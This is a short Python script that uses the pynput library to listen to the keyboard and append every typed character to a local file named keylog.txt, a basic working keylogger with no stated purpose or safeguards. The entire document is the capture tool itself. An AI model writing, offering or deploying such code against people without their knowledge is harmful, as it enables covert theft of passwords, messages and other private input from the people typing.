from pynput import keyboard

def keyPressed(key):
    print(str(key))
    try:
        char = key.char
    except AttributeError:
        print("Error getting char")
        return
    with open("keylog.txt", 'a') as logkey:
        logkey.write(char)

if __name__=="__main__":
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()